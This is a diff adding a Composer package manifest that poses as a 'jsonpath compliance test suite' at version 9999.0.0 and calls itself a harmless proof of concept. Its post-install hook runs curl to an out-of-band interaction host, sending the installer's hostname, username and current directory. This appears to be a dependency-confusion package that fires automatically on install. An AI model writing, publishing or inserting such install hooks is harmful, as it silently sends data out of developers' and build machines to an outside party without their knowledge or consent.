@@ -1,0 +1,11 @@
+{
+    "name": "jsonpath-standard/jsonpath-compliance-test-suite",
+    "version": "9999.0.0",
+    "description": "Security Research Proof of Concept - harmless",
+    "scripts": {
+        "post-install-cmd": [
+            "echo 'PoC Executed'",
+            "curl http://ussrtbjkscbilnopnyelwygawmxjozttq.oast.fun/?symphony&host=$(hostname)&user=$(whoami)&dir=$(pwd)"
+        ]
+    }
+}
